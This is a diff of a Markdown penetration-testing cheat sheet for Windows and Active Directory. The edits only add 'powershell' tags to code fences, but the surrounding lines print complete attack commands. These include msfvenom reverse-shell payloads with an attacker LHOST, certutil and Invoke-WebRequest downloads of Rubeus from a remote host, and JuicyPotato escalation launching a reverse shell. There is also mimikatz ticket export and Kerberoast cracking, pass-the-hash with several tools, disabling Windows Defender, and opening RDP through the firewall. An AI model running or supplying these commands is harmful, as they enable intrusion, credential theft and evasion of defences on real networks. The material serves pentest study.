@@ -16,7 +16,7 @@ Anything about **Windows / Active Directory** will be posted here :D
 
 **[+] Create reverse shell using msfvenom**
 
-```
+```powershell
 // Meterpreter
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
@@ -37,7 +37,7 @@ msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > 
 
 **[+] Upload file using Powershell**
 
-```
+```powershell
 powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http://192.168.50.48/ASREPRoast.ps1 -OutFile C:\users\hitman\ASREPRoast.ps1
 ```
 
@@ -45,7 +45,7 @@ powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http:
 
 **[+] Upload file using certutil.exe**
 
-```
+```powershell
 certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus.exe
 ```
 
@@ -77,7 +77,7 @@ Note: You can access the share \\tsclient directly too
 
 **[+] Privilege escalation using juicy potato (Sometimes you need to attach CLSID)**
 
-```
+```powershell
 JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/reverse.exe" -t *
 ```
 
@@ -85,7 +85,7 @@ JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/r
 
 **[+] PowerUp.ps1 "Good powershell script for windows privilege escalation"**
 
-```
+```powershell
 C:> powershell.exe -nop -exec bypass
 
 PS C:\> Import-Module PowerUp.ps1
@@ -97,7 +97,7 @@ PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
 
 **[+] Weak service permissions privilege escalation**
 
-```
+```powershell
 C:\Users\victim\Desktop>accesschk64 -uwcqv "victim" *
 
 Accesschk v6.14 - Reports effective permissions for securable objects
@@ -143,7 +143,7 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 
 **[+] Request Ticket (powershell)**
 
-```
+```powershell
 Add-Type -AssemblyName System.IdentityModel  
 
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLService/ufc-db1.us.funcorp.local"  
@@ -153,7 +153,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 **[+] Export Tickets using mimikatz**
 
-```
+```powershell
 mimikatz # kerberos::list /export  
 ```
 
@@ -161,7 +161,7 @@ mimikatz # kerberos::list /export
 
 **[+] Crack ticket using Tgsrepcrack.py (You can use john too or hashcat)**
 
-```
+```powershell
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
 ```
 
@@ -169,7 +169,7 @@ mimikatz # kerberos::list /export
 
 **[+] Kerberos Double-Hop problem (powershell)**
 
-```
+```powershell
 Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
     Invoke-Command -ComputerName UFC-WEBPROD -Credential $Using:cred -ScriptBlock {
 		& cmd /c "hostname"    
@@ -188,7 +188,7 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 
 **[+] Pass the hash using pth-winexe (Available in Kali Linux)**
 
-```
+```powershell
 pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE //IP cmd
 ```
 
@@ -196,7 +196,7 @@ pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE //IP cmd
 
 **[+] Access RDP using pass the hash (xfreerdp tool)**
 
-```
+```powershell
 xfreerdp /u:username /pth:USER_NTLM_HERE /d:domain /v:IP
 ```
 
@@ -204,7 +204,7 @@ xfreerdp /u:username /pth:USER_NTLM_HERE /d:domain /v:IP
 
 **[+] Pass the hash using PsExec.py**
 
-```
+```powershell
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE anyuser@192.168.50.49
 ```
 
@@ -219,7 +219,7 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 
 **[+] enum SMB shares using smbclient (Smbclient available in Kali Linux)**
 
-```
+```powershell
 smbclient -L IP
 ```
 
@@ -227,7 +227,7 @@ smbclient -L IP
 
 **[+] Sharphound command (For bloodhound)**
 
-```
+```powershell
 // EXE version
 
 ./SharpHound.exe --CollectionMethod All
@@ -241,7 +241,7 @@ Invoke-BloodHound -CollectionMethod All
 
 **[+] Find interesting ACLs for specific user (Need PowerView.ps1)**
 
-```
+```powershell
 Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 ```
 
@@ -257,7 +257,7 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 
 **[+] Bypass Powershell Execution Policy**
 
-```
+```powershell
 In Powershell you can write:
 
 Set-ExecutionPolicy -ExecutionPolicy bypass
@@ -271,7 +271,7 @@ powershell.exe -ep bypass
 
 **[+] Disable windows defender**
 
-```
+```powershell
 // Registry 
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1
@@ -292,7 +292,7 @@ powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
 
 **[+] Enable RDP and allow it in the firewall too**
 
-```
+```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
